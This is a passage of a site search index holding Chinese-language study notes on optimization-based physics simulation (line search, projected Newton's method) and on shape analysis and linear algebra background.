\u7279\u70b9\u662f\u5c06\u63a5\u89e6\u8fc7\u7a0b\u8fd1\u4f3c\u4e3a Smooth Potential Energy\uff0c\u8fd9\u79cd\u8f6c\u6362\u6709\u6548\u5730\u5c06\u95ee\u9898\u8f6c\u6362\u4e3a\u65e0\u7ea6\u675f\u95ee\u9898\uff0c\u4ece\u800c\u53ef\u4ee5\u5e94\u7528\u5404\u79cd\u9ad8\u6548\u7684\u4f18\u5316\u6280\u672f\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#projected-newton","title":"Projected Newton","text":""},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#line-search","title":"Line Search","text":"<p>\u5728\u8fed\u4ee3\u6700\u5c0f\u5316\u7684\u65b9\u6cd5\u4e2d\uff0c\u7ebf\u641c\u7d22\u80fd\u591f\u786e\u4fdd\u5728\u65b0\u7684\u70b9\u5904\u76ee\u6807\u80fd\u91cf\u51cf\u5c11\uff0c\u5b83\u5c06\u6b65\u957f\u8fdb\u884c\u4e86\u5212\u5206\u3002</p> <p>\u5177\u4f53\u800c\u8a00\uff0c\u662f\u5c06\u6bcf\u4e00\u6b65\u8fed\u4ee3\u7684\u66f4\u65b0 \\(x^i \\leftarrow x\\) \u4fee\u6539\u4e3a \\(x^i\\leftarrow x+ \\alpha( x- x^i)\\) \uff0c\u5176\u4e2d \\(\\alpha \\in (0,1]\\) \u5bf9\u80fd\u91cf \\(E(x)\\) \u7684\u51cf\u5c11\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002</p> <p>Backtracing Line Search \u7ed9\u5b9a\u4e86\u4e00\u4e2a\u4e0b\u964d\u65b9\u5411\uff0c\u901a\u8fc7\u7b80\u5355\u7684\u51cf\u534a\u6765\u627e\u51fa\u4e00\u4e2a\u5927\u81f4\u5408\u7406\u7684 \\(\\alpha\\) \u53d6\u503c\uff1a</p> <p></p> <p>Other Line Search</p> <p>\u4e00\u4e9b\u5176\u5b83\u7684 Line Search \u65b9\u6cd5\u901a\u8fc7\u63d2\u503c\u7684\u65b9\u5f0f\u627e\u5230 \\(\\alpha\\)\uff0c\u4f7f\u5f97\u65b0\u4f4d\u7f6e\u80fd\u591f\u63a5\u8fd1\u5c40\u90e8\u6700\u5c0f\u503c\u3002\u7136\u800c\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u4f1a\u5e26\u6765\u66f4\u9ad8\u7684\u8ba1\u7b97\u6210\u672c\uff0c\u5e76\u4e14\u4e0d\u4e00\u5b9a\u80fd\u591f\u4f18\u5316\u603b\u4f53\u65f6\u95f4\u3002</p> <p>\u5728\u7ed3\u5408\u4e86 Line Search \u7684\u725b\u987f\u6cd5\u4e2d\uff0c\u5982\u679c Newton's Method \u59cb\u7ec8\u751f\u6210\u4e00\u4e2a\u4e0b\u964d\u7684\u641c\u7d22\u65b9\u5411\uff0c\u5219\u8be5\u65b9\u6cd5\u5bf9\u4e8e\u4e00\u4e2a\u6709\u4e0b\u754c\u7684\u51fd\u6570\u4e00\u5b9a\u4fdd\u8bc1\u6536\u655b\u3002</p> <p>\u6211\u4eec\u77e5\u9053\u5bf9\u4e8e\u7b2c i \u6b21\u8fed\u4ee3\uff0c\u641c\u7d22\u65b9\u5411 \\(p= -(\\nabla ^2 E(x^i))^{-1} \\nabla E(x^i)\\)\u3002\u90a3\u4e48\uff0c\u5bf9\u4e8e\u51f8\u51fd\u6570\u80fd\u91cf\uff08Convex Energies\uff09\uff0c\\(p\\) \u59cb\u7ec8\u662f\u4e0b\u964d\u65b9\u5411\uff1b\u5bf9\u4e8e\u975e\u51f8\u51fd\u6570\u80fd\u91cf\uff0c\u5219\u4e0d\u4e00\u5b9a\u603b\u662f\u6210\u7acb\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#gradient-based-optimization","title":"Gradient-Based Optimization","text":"<p>\u6807\u51c6\u725b\u987f\u6cd5\u7684\u641c\u7d22\u65b9\u5411\u901a\u8fc7\u5982\u4e0b\u4f18\u5316\u65b9\u7a0b\u8ba1\u7b97\uff1a</p> \\[\\tag{3.3.1} p=argmin_{\\Delta x} \\left( E(x^i) + \\Delta x^T \\nabla E(x^i) + \\frac{1}{2} \\Delta x^T P\\Delta x\\right) \\] <p>\u5176\u4e2d \\(P=\\nabla ^2 E(x^i)\\)\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4f7f\u7528\u5176\u5b83\u77e9\u9635\u6765\u201c\u4ee3\u7406\u201d \\(P\\)\uff0c\u4f8b\u5982\u53d6 \\(P=I\\)\uff0c\u6b64\u65f6\u89e3\u5f97 \\(p=-\\nabla E(x^i)\\)\u3002\u8fd9\u79cd\u8fd1\u4f3c\u867d\u7136\u7b80\u5355\uff0c\u4f46\u662f\u53ea\u4fdd\u7559\u4e86\u4e00\u9636\u4fe1\u606f\uff0c\u6536\u655b\u8f83\u6162\u3002</p> <p>\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u4ee3\u7406\u77e9\u9635 \\(P\\) \u80fd\u591f\u66f4\u63a5\u8fd1 Hession \u77e9\u9635 \\(\\nabla^2 E(x^i)\\)\u3002\u4e00\u79cd\u53ef\u884c\u7684\u5b9e\u8df5\u662f\u4f7f\u7528 Hession \u77e9\u9635\u7684 SPD \u4f5c\u4e3a\u4ee3\u7406\uff0c\u8fd9\u53ef\u4ee5\u786e\u4fdd\u641c\u7d22\u65b9\u5411\u59cb\u7ec8\u4e0b\u964d\u7684\u540c\u65f6\uff0c\u4fdd\u6301\u8f83\u9ad8\u7684\u6536\u655b\u901f\u5ea6\u3002</p> <p>SPD Matrix: \u5bf9\u79f0\u6b63\u5b9a\u77e9\u9635</p> <p>\u5f53\u4e8c\u6b21\u9879\u7684\u7cfb\u6570\u77e9\u9635 \\(P\\) \u662f SPD \u7684\u65f6\u5019\uff0c\u5219\u51fd\u6570\u7684\u51f8\u6027\u5f97\u4ee5\u4fdd\u8bc1\uff0c\u8fd9\u6837\u89e3\u51fa\u6765\u7684\u641c\u7d22\u65b9\u5411\u59cb\u7ec8\u662f\u4e0b\u964d\u7684\u65b9\u5411\u3002</p> <p>\u83b7\u53d6\u6b64\u7c7b SPD \u7684\u7b80\u5355\u65b9\u6cd5\u662f\u5c06 \\(\\nabla^2 E(x^i)\\) \u6295\u5f71\u5230\u6700\u8fd1\u7684\u534a\u6b63\u5b9a\u77e9\u9635\u4e0a\uff0c\u901a\u8fc7\u6c42\u89e3\u5982\u4e0b\u7ea6\u675f\u4f18\u5316\u65b9\u7a0b\uff1a</p> \\[ min_P ||P-\\nabla^2 E(x^i)||_F,\\ \\ s.t.\\ v^TPv \\ge 0,\\ v\\ne 0 \\] <p>\u76f4\u89c2\u4e0a\u6765\u770b\uff0c\\(P\\) \u662f\u5c06 \\(\\nabla^2 E(x^i)\\) \u7684\u6240\u6709\u8d1f\u7279\u5f81\u503c\u6e05\u96f6\u5f97\u5230\u7684\uff1a</p> <ul> <li>&lt;1&gt; \u5148\u5bf9 Hession \u77e9\u9635\u505a\u7279\u5f81\u503c\u5206\u89e3 \\(\\nabla^2 E(x^i)= Q\\Lambda Q^{-1}\\)<ul> <li>\u5176\u4e2d \\(Q\\) \u7684\u5217\u5411\u91cf\u662f\u5f52\u4e00\u5316\u7684\u7279\u5f81\u5411\u91cf\uff0c\\(\\Lambda\\) \u662f\u7279\u5f81\u5bf9\u89d2\u77e9\u9635</li> </ul> </li> <li>&lt;2&gt; \u5bf9\u4e8e \\(\\Lambda\\) \u4e2d\u6bcf\u4e2a\u7279\u5f81\u503c\uff0c\u5982\u679c\u8be5\u7279\u5f81\u503c\u4e3a\u8d1f\uff0c\u5219\u7f6e\u96f6\uff0c\u5f97\u5230\u65b0\u7684\u5bf9\u89d2\u77e9\u9635 \\(\\hat{\\Lambda}\\)<ul> <li>\\(\\hat{\\Lambda}_{ii} =\\Lambda_{ii} &gt;0?\\Lambda_{ii}:0\\)</li> </ul> </li> <li>&lt;3&gt; \u7528\u66f4\u65b0\u540e\u7684\u7279\u5f81\u503c\u91cd\u6784\u4ee3\u7406\u77e9\u9635<ul> <li>\\(P=Q\\hat{\\Lambda} Q^{-1}\\)</li> </ul> </li> </ul> <p>\u73b0\u5728\uff0c\u6211\u4eec\u5c06\u786e\u4fdd\u5168\u5c40\u6536\u655b\u7684\u6295\u5f71\u725b\u987f\u6cd5\u5e94\u7528\u5230\u9690\u5f0f\u79ef\u5206\u7684 Backward Euler \u65f6\u95f4\u79ef\u5206\u4e2d\uff1a</p> <p></p> <p>\\(||p||_{\\infty}\\) \u5373\u4e3a \\(\\max \\{|x_i|\\}\\)\uff0c\u5728 python \u53ef\u4ee5\u7528 <code>np.linalg.norm(x, np.inf)</code> \u8ba1\u7b97</p>"},{"location":"Accumulation/ShapeAnalysis/","title":"Index","text":"<p> \u7ea6 13 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Accumulation/ShapeAnalysis/#reference","title":"Reference","text":"<ul> <li>\u8bfe\u7a0b\u7f51\u7ad9</li> <li>\u8bfe\u7a0b\u89c6\u9891</li> <li>\u501f\u9274\u7b14\u8bb0</li> </ul>"},{"location":"Accumulation/ShapeAnalysis/CH1/","title":"Introduction","text":""},{"location":"Accumulation/ShapeAnalysis/CH1/#introduction","title":"Introduction","text":"<p> \u7ea6 1535 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Geometric Data Processing \u53ef\u4ee5\u4ece\u4ee5\u4e0b\u4e24\u4e2a\u89d2\u5ea6\u7406\u89e3</p> <p></p>"},{"location":"Accumulation/ShapeAnalysis/CH1/#toolbox","title":"Toolbox","text":""},{"location":"Accumulation/ShapeAnalysis/CH1/#mathematicians-toolkit","title":"Mathematician's Toolkit","text":"<p>\u6b27\u51e0\u91cc\u5f97\u51e0\u4f55\u6240\u8003\u8651\u7684\u5f62\u72b6\u90fd\u8fc7\u4e8e\u7b80\u5355\uff0c\u867d\u7136\u5706\u89c4\u548c\u76f4\u5c3a\u8db3\u4ee5\u6d4b\u91cf\u548c\u6784\u9020\u591a\u8fb9\u5f62\u548c\u5706\uff0c\u5374\u96be\u4ee5\u4ece\u73b0\u4ee3\u5404\u79cd\u6a21\u578b\u4e2d\u5f97\u5230\u540c\u6837\u7cbe\u786e\u7684\u7ed3\u679c\u3002</p> <p>\u6570\u4e2a\u4e16\u7eaa\u4ee5\u6765\uff0c\u4eba\u4eec\u81f4\u529b\u4e8e\u62d3\u5c55\u51e0\u4f55\u8bed\u8a00\u548c\u7406\u8bba\uff0c\u4e3a\u6d4b\u91cf\u548c\u6bd4\u8f83\u5f62\u72b6\u3001\u7ef4\u5ea6\u3001\u7c97\u7cd9\u5ea6\u548c\u8fde\u901a\u6027\u4e0d\u540c\u7684\u5bf9\u8c61\u63d0\u4f9b\u516c\u7406\u5316\u4f53\u7cfb\u3002</p> <p>Differential Geometry</p> <ul> <li>\u5fae\u5206\u51e0\u4f55\u901a\u8fc7\u65e0\u7a77\u5c0f\u6765\u7406\u89e3\u5f62\u72b6\uff0c\u4e13\u6ce8\u4e8e\u51e0\u4f55\u7ed3\u6784\u7684\u5c40\u90e8\u5206\u6790</li> <li>\u5fae\u5206\u51e0\u4f55\u7684\u57fa\u672c\u7814\u7a76\u5bf9\u8c61\u662f\u6d41\u5f62\uff08manifold\uff09\uff0c\u5373\u5c40\u90e8 k \u7ef4\u5bf9\u8c61\u3002</li> <li>\u5fae\u5206\u51e0\u4f55\u4e2d\uff0c\u5f88\u591a\u5185\u5728\u91cf\uff08intrinsic\uff09\u53ea\u4f9d\u8d56\u4e8e\u5f62\u72b6\u672c\u8eab\uff0c\u800c\u4e0d\u4f9d\u8d56\u4e8e\u5750\u6807\u7cfb\u6216\u8005\u67d0\u4e9b\u53c2\u6570\u5316\u5f62\u5f0f\uff0c\u4f8b\u5982\u66f2\u7387\u3001\u5207\u5411\u91cf\u3001\u6d4b\u5730\u7ebf\u7b49</li> </ul> Manifold\uff0c\u6d41\u5f62 <p>\u5728\u5c0f\u8303\u56f4\u5185\u770b\u8d77\u6765\u50cf\u6b27\u51e0\u91cc\u5f97\u7a7a\u95f4\u7684\u7a7a\u95f4\u3002\u4f8b\u5982\uff0c\u5706\u6574\u4f53\u662f\u4e00\u4e2a\u73af\uff082D\uff09\uff0c\u4f46\u662f\u5728\u67d0\u4e00\u5c0f\u6bb5\u4e0a\u770b\u8d77\u6765\u5c31\u662f\u4e00\u6bb5\u76f4\u7ebf\uff081D\uff09\uff1b\u7403\u9762\u6574\u4f53\u5f2f\u8d77\u6765\u4e86\uff083D\uff09\uff0c\u4f46\u662f\u5728\u67d0\u4e2a\u5c0f\u5757\u4e0a\u770b\u8d77\u6765\u5c31\u662f\u5e73\u9762\uff082D\uff09\u3002</p> <ul> <li>\u4e00\u7ef4\u6d41\u5f62\uff1a\u66f2\u7ebf\uff08\u5706\uff0c\u76f4\u7ebf\uff0c\u87ba\u65cb\u7ebf\uff09</li> <li>\u4e8c\u7ef4\u6d41\u5f62\uff1a\u66f2\u9762\uff08\u7403\u9762\uff0c\u73af\u9762\uff0c\u7eb8\u7247\uff09</li> <li>\u9ad8\u7ef4\u6d41\u5f62\uff1a\u4e09\u7ef4\u6d41\u5f62\uff08\u6211\u4eec\u751f\u6d3b\u7684\u7a7a\u95f4\uff09\u3001\u56db\u7ef4\u6d41\u5f62\uff08\u65f6\u7a7a\u6a21\u578b\uff09</li> </ul> <p>Differential Equations</p> <p>\u5fae\u5206\u65b9\u7a0b\u6307\u7684\u662f\u5b9a\u51fd\u6570\u548c\u5bfc\u6570\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u5e38\u5fae\u5206\u65b9\u7a0b\u548c\u504f\u5fae\u5206\u65b9\u7a0b\u90fd\u81ea\u7136\u7528\u4f5c\u8868\u8fbe\u548c\u5206\u6790\u6d41\u5f62\u53ca\u5176\u5b83\u51e0\u4f55\u7ed3\u6784\u4e0a\u4e0d\u540c\u91cf\u5173\u7cfb\u7684\u5de5\u5177\u3002</p> <ul> <li>\u5e38\u5fae\u5206\u65b9\u7a0b(ODEs) \u63cf\u8ff0\u5e73\u884c\u4f20\u8f93\uff0c\u5373\u6cbf\u7740\u6d41\u5f62\u62d6\u52a8\u5411\u91cf\u7684\u540c\u65f6\uff0c\u4fdd\u6301\u63a5\u89e6\u800c\u4e0d\u8fdb\u884c\u4e0d\u5fc5\u8981\u65cb\u8f6c\u7684\u8fc7\u7a0b<ul> <li>\u5728\u5e73\u9762\u4e0a\uff1a\u53ea\u9700\u8981\u628a\u5411\u91cf\u4e00\u8d77\u5e73\u79fb\u5373\u53ef\uff08\u56e0\u4e3a\u5207\u5e73\u9762\u4e0d\u53d8\uff09\u3002</li> <li>\u5728\u66f2\u9762\u4e0a\uff1a\u5207\u5e73\u9762\u4f1a\u968f\u7740\u70b9\u7684\u4f4d\u7f6e\u6539\u53d8\uff0c\u6240\u4ee5\u5411\u91cf\u7684\u65b9\u5411\u4e5f\u5fc5\u987b\u8c03\u6574\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u6ee1\u8db3\u4e00\u4e2a ODE\u3002ODE \u53ef\u4ee5\u63cf\u8ff0\u201c\u5982\u4f55\u6cbf\u7740\u4e00\u6761\u66f2\u7ebf\u79fb\u52a8\u5411\u91cf\u201d\u3002</li> </ul> </li> <li>\u504f\u5fae\u5206\u65b9\u7a0b(PDEs) PDE \u80fd\u591f\u201c\u611f\u53d7\u5230\u201d\u51e0\u4f55\u5f62\u72b6\u7684\u4e0d\u540c\u3002\u4f8b\u5982\u70ed\u65b9\u7a0b\uff1a<ul> <li>\u5e73\u677f\uff1a\u70ed\u91cf\u6cbf\u5e73\u9762\u6269\u6563</li> <li>\u7403\u4f53\uff1a\u70ed\u91cf\u6269\u6563\u65b9\u5f0f\u53d7\u5230\u7403\u9762\u51e0\u4f55\u7684\u5f71\u54cd</li> </ul> </li> </ul> <p>Riemannian Geometry</p> <p>\u9ece\u66fc\u51e0\u4f55\u53ef\u4ee5\u8bf4\u662f\u5fae\u5206\u51e0\u4f55\u7684\u4e00\u4e2a\u5206\u652f\uff0c\u5b83\u5c06\u5f62\u72b6\u548c\u62d3\u6251\uff08\u6216\u8fde\u901a\u6027\uff09\u5206\u79bb\u3002</p> <p>\u62d3\u6251\u7a7a\u95f4\u8868\u793a\u70b9\u4e0e\u70b9\u4e4b\u95f4\u7684\u8fde\u901a\u5173\u7cfb\uff0c\u5173\u5fc3\u7684\u662f\u8fde\u901a\u6027\uff1b\u800c\u51e0\u4f55\u5173\u6ce8\u957f\u5ea6\u3001\u89d2\u5ea6\u3001\u9762\u79ef\u3001\u66f2\u7387\u7b49</p> <p>\u4e00\u4e2a\u542f\u53d1\u6027\u7684\u4f8b\u5b50\uff0c\u8003\u8651\u5c06\u4e16\u754c\u5730\u56fe\u5e73\u94fa\u5728\u684c\u5b50\u4e0a\uff0c\u8fd9\u5f20\u5730\u56fe\u8db3\u4ee5\u7528\u6765\u7406\u89e3\u54ea\u4e9b\u5927\u9646\u76f8\u4e92\u8fde\u63a5\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u77e5\u9053\u4f5c\u4e3a\u4e00\u5f20\u7eb8\u7684\u5730\u56fe\u7684\u51e0\u4f55\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u5728\u7eb8\u4e0a\u4ee5\u82f1\u5bf8\u6d4b\u91cf\u7684\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u5e76\u4e0d\u662f\u5730\u7403\u8868\u9762\u7684\u771f\u5b9e\u8ddd\u79bb\u3002</p> <p>\u800c\u9ece\u66fc\u7684\u51e0\u4f55\u6a21\u578b\u8003\u8651\u4e86\u9ece\u66fc\u6d41\u5f62\uff0c\u5b83\u5c06\u62d3\u6251\u7a7a\u95f4\uff08\u4f8b\u5982\u5730\u56fe\uff09\u4e0e\u8ba1\u7b97\u771f\u5b9e\u51e0\u4f55\u4e0a\u7684\u957f\u5ea6\u548c\u89d2\u5ea6\u7684\u65b9\u6cd5\u76f8\u7ed3\u5408\uff08\u4f8b\u5982\u7ecf\u7eac\u7ebf\uff09\u3002\u540e\u8005\u88ab\u5c01\u88c5\u4e3a\u5730\u56fe\u4e0a\u6bcf\u4e2a\u70b9\u7684\u5185\u79ef\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u56e0\u4f4d\u7f6e\u4e0d\u540c\u548c\u53d8\u5316\u3002</p> <p>\u5728\u5730\u56fe\u4e0a\u7684\u5357\u7f8e\u6d32\u548c\u5357\u6781\u6d32\u753b\u4e00\u4e2a\u76f8\u540c\u5411\u91cf\uff0c\u5b83\u4eec\u7684\u62c9\u4f38\u7a0b\u5ea6\u5e76\u4e0d\u76f8\u540c</p> <p>Metric Geometry</p> <p>\u5ea6\u91cf\u51e0\u4f55\u5305\u542b\u5ea6\u91cf\u7a7a\u95f4\u7684\u51e0\u4f55\u548c\u5141\u8bb8\u5ea6\u91cf\u51fd\u6570\u7684\u7a7a\u95f4\u3002</p> <p>\u4e00\u4e2a\u5ea6\u91cf \\(d(x,y)\\) \u7531\u4ee5\u4e0b\u51e0\u70b9\u6027\u8d28\u533a\u5206\uff1a</p> \\[\\begin{array}l d(x,y) \\gt 0 &amp; (\\text {nonnegativity})  \\\\ d(x,y)=0 \\Leftrightarrow x=y &amp; (\\text{Leibniz's Law}) \\\\ d(x,y) = d(y,x) &amp; (\\text{symmetry}) \\\\ d(x,y) \\le d(x,y) + d(y,z) &amp; (\\text{triangle inequality}) \\end{array} \\] <p>\u4e0a\u9762\u56db\u4e2a\u6027\u8d28\u516c\u7406\u5316\u7684\u5b9a\u4e49\u4e86\u201c\u8ddd\u79bb\u201d\u7684\u542b\u4e49</p> <p>\u8bb8\u591a\u7a7a\u95f4\u5373\u4fbf\u4e0d\u662f\u6d41\u5f62\u4e5f\u5141\u8bb8\u5ea6\u91cf\u7ed3\u6784\uff0c\u5728\u8ba1\u7b97\u9886\u57df\u4e2d\u7684\u5173\u952e\u4f8b\u5b50\u5c31\u662f\u56fe\u6216\u7f51\u7edc\uff0c\u5b83\u88ab\u63cf\u8ff0\u4e3a\u901a\u8fc7\u8fb9\u8fde\u63a5\u7684\u8282\u70b9\u96c6\u5408\u3002\u5c3d\u7ba1\u50cf\u56fe\u8fd9\u6837\u7684\u5bf9\u8c61\u4e0d\u5305\u542b\u5bfc\u6570\u548c\u5207\u7a7a\u95f4\uff0c\u4f46\u51e0\u4f55\u63a8\u7406\u5728\u8bbe\u8ba1\u548c\u9ad8\u6548\u5904\u7406\u5ea6\u91cf\u7ed3\u6784\u6570\u636e\u4e0a\u53ef\u4ee5\u53d1\u6325\u91cd\u8981\u4f5c\u7528\u3002</p> <p>Optimal Transport</p> <p>\u6700\u4f18\u4f20\u8f93\u628a\u70b9\u4e0e\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u63a8\u5e7f\u5230\u6982\u7387\u5206\u5e03\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u4f8b\u5982\u5982\u679c\u67d0\u4e2a\u70b9\u7684\u4f4d\u7f6e\u4e0d\u662f\u786e\u5b9a\u7684\uff0c\u800c\u662f\u4e00\u4e2a\u201c\u6a21\u7cca\u8303\u56f4\u201d\u5185\u7684\u6982\u7387\u5206\u5e03\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6700\u4f18\u4f20\u8f93\u6765\u8861\u91cf\u5206\u5e03\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</p> <p>\u5373\u6700\u4f18\u4f20\u8f93\u80fd\u591f\u5904\u7406\u4e0d\u786e\u5b9a\u6570\u636e\uff0c\u73b0\u5b9e\u4e2d\u5927\u591a\u6570\u6570\u636e\u90fd\u662f\u6709\u566a\u58f0\u3001\u4e0d\u5b8c\u6574\u7684</p> <p>\u6700\u4f18\u4f20\u8f93\u5728\u673a\u5668\u5b66\u4e60\u4e2d\u6709\u5e7f\u6cdb\u5e94\u7528\u3002</p>"},{"location":"Accumulation/ShapeAnalysis/CH1/#computational-themes","title":"Computational Themes","text":"<p>\u5728\u51e0\u4f55\u7cfb\u7edf\u4e2d\uff0c\u5f62\u72b6\u7684\u8868\u793a\u65b9\u5f0f\u662f\u4e00\u4e2a\u6838\u5fc3\u8bbe\u8ba1\u51b3\u7b56\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u9009\u9879\uff1a</p> <ul> <li>Point Cloud: \u5373\u5d4c\u5165\u6b27\u51e0\u91cc\u5f97\u7a7a\u95f4\u4e2d\u7684\u70b9\u96c6\u5408\u3002<ul> <li>\u70b9\u4e91\u662f\u6700\u5bb9\u6613\u83b7\u53d6\u548c\u5b58\u50a8\u7684\u51e0\u4f55\u8868\u793a\uff0c\u4f46\u5b83\u4eec\u662f\u65e0\u7ed3\u6784\u7684\uff0c\u4f8b\u5982\u5b83\u4eec\u5e76\u4e0d\u6307\u793a\u54ea\u4e9b\u70b9\u6784\u6210\u4e86\u4e2d\u5fc3\u70b9\u5468\u56f4\u7684\u5c40\u90e8\u90bb\u57df\u3002</li> </ul> </li> <li>Meshes: \u7531\u4e09\u89d2\u5f62\u6216\u56db\u9762\u4f53\u7684\u7f51\u683c\u7ec4\u6210\uff0c\u63d0\u4f9b\u4e86\u70b9\u4e91\u4e2d\u4e0d\u5b58\u5728\u7684\u8fde\u63a5\u4fe1\u606f<ul> <li>\u7f51\u683c\u7684\u590d\u6742\u5ea6\u53d6\u51b3\u4e8e\u6570\u636e\u7684\u7ef4\u5ea6\u3002</li> </ul> </li> <li>Computer Aided Design(CAD): CAD \u53d7\u76ca\u4e8e\u8868\u9762\u548c\u4f53\u79ef\u7684\u51e0\u4f55\u8868\u793a\uff0c\u4f8b\u5982\u5e73\u6ed1\u53c2\u6570\u5316\u51fd\u6570(smooth parameterized functions)\u3002<ul> <li>\u8fd9\u79cd\u8868\u793a\u5141\u8bb8\u7cbe\u786e\u8ba1\u7b97\u5fae\u5206\u91cf\uff0c\u4f46\u8bbe\u8ba1\u5e08\u88ab\u9650\u5236\u5728\u8f83\u5c0f\u7684\u5f62\u72b6\u7a7a\u95f4\u3002</li> </ul> </li> <li>Implict Methods: \u5c06\u6d41\u5f62\u8868\u793a\u4e3a \\(\\{x\\in R^n : f(x) = 0\\}\\)<ul> <li>\u53ef\u4ee5\u4f18\u96c5\u5730\u5904\u7406\u62d3\u6251\u53d8\u5316\uff0c\u4f46\u662f\u5982\u679c\u9700\u8981\u5728\u8fdc\u79bb\u96f6\u6c34\u5e73\u96c6\u7684\u5730\u65b9\u5b58\u50a8 \\(f(x)\\) \u4f1a\u5f88\u6d6a\u8d39\u7a7a\u95f4\uff1b\u4ee5\u53ca\u5728\u9ad8\u5206\u8fa8\u7387\u4e0b\u8868\u8fbe\u7ec6\u8282\u8f83\u4e3a\u56f0\u96be\u3002</li> </ul> </li> <li>Graphic: \u5b9a\u4e49\u4e3a\u4e00\u4e2a\u6709\u6743\u56fe<ul> <li>\u4e0d\u4f9d\u8d56\u5d4c\u5165\u5728 \\(R^n\\)\uff0c\u9002\u5408\u5206\u6790\u7f51\u7edc\u7ed3\u6784\uff1b\u4f46\u53ea\u80fd\u8868\u8fbe\u8def\u5f84\u548c\u957f\u5ea6\u5173\u7cfb\uff0c\u7f3a\u5c11\u66f4\u4e30\u5bcc\u7684\u51e0\u4f55\u6027\u8d28</li> </ul> </li> <li>Metric Spaces: \u662f\u6700\u901a\u7528\u7684\u8868\u793a\uff0c\u5bf9\u4efb\u610f\u4e24\u70b9 \\(i,j\\)\uff0c\u5b58\u50a8\u5b83\u4eec\u7684\u8ddd\u79bb \\(d(i,j)\\)<ul> <li>\u4f18\u70b9\u662f\u901a\u7528\u6027\uff0c\u7f3a\u70b9\u662f\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(n^2)\\)\uff0c\u5e76\u4e14\u4e0d\u80fd\u76f4\u63a5\u505a\u5fae\u79ef\u5206\u6216\u8005\u7cbe\u7ec6\u51e0\u4f55\u8ba1\u7b97</li> </ul> </li> </ul>"},{"location":"Accumulation/ShapeAnalysis/CH2/","title":"Mathmatical Background","text":""},{"location":"Accumulation/ShapeAnalysis/CH2/#mathematical-background","title":"Mathematical Background","text":"<p> \u7ea6 681 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Accumulation/ShapeAnalysis/CH2/#linear-algebra","title":"Linear Algebra","text":"<p>\u5411\u91cf\u662f\u7ebf\u6027\u4ee3\u6570\u7684\u57fa\u672c\u6982\u5ff5\uff0c\u56fe\u5f62\u5b66\u4e2d\u9ed8\u8ba4\u5411\u91cf\u90fd\u662f\u5217\u5411\u91cf\uff0c\u5411\u91cf\u5185\u79ef\u548c\u4e8c\u6b21\u578b\u7b49\u90fd\u53ef\u4ee5\u901a\u8fc7\u8f6c\u7f6e\u548c\u77e9\u9635\u4e58\u6cd5\u6765\u8868\u793a\uff1a</p> \\[\\begin {array}l \\text{Dot Product}:&amp; x^Ty \\\\ \\text{Quadratic form}: &amp; x^TAx \\end{array} \\] <p>\u66f4\u4e25\u683c\u6765\u8bf4\uff0c\u5411\u91cf\u5750\u6807\u662f\u5411\u91cf\u672c\u8eab\u548c\u57fa\u5411\u91cf \\(e_k\\) \u7684\u5185\u79ef</p> <p>\u77e9\u9635\u88ab\u7406\u89e3\u4e3a\u7ebf\u6027\u7b97\u5b50\u6216\u5411\u91cf\u5185\u79ef\uff0c\u6211\u4eec\u4f7f\u7528 Einstein \u8bb0\u53f7\u6765\u663e\u5f0f\u533a\u5206\u5b83\u4eec\uff1a</p> Linear MapQuadratic Form <p></p> <p></p> <p>\u7ebf\u6027\u4ee3\u6570\u7684\u53e6\u5916\u4e00\u5927\u5e94\u7528\u662f\u6c42\u89e3\u7ebf\u6027\u7cfb\u7edf \\(Ax=b\\)\u3002\u5f53\u77e9\u9635 \\(A\\) \u53ef\u9006\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u9ad8\u65af\u6d88\u5143\u7b49\u65b9\u6cd5\u6765\u6c42\u89e3\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u5b83\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(n^3)\\)\u3002</p> <p>\u4efb\u4f55\u60c5\u51b5\u4e0b\u6211\u4eec\u90fd\u5e94\u907f\u514d\u5bf9\u77e9\u9635\u6c42\u9006\uff0c\u8fd9\u901a\u5e38\u662f unstable \u548c slower \u7684</p> <p>\u76ee\u524d\u7684\u6c42\u89e3\u5668\u5206\u4e3a\u76f4\u63a5\u6c42\u89e3\u548c\u8fed\u4ee3\u6c42\u89e3\u4e24\u7c7b\uff1a</p> <ul> <li>Direct explicit matrix<ul> <li>\u9ad8\u65af\u6d88\u5143\u6cd5\u3001LU \u5206\u89e3\u3001Cholesky \u5206\u89e3\u3001QR \u5206\u89e3\u7b49</li> <li>\u6570\u503c\u7a33\u5b9a\u6027\u66f4\u597d\uff0c\u4f46\u590d\u6742\u5ea6\u8f83\u9ad8</li> </ul> </li> <li>Iterative apply matrix repeatedly<ul> <li>Jacobi\u3001Gauss-Seidel\u3001\u5171\u8f6d\u68af\u5ea6(CG)\u7b49</li> 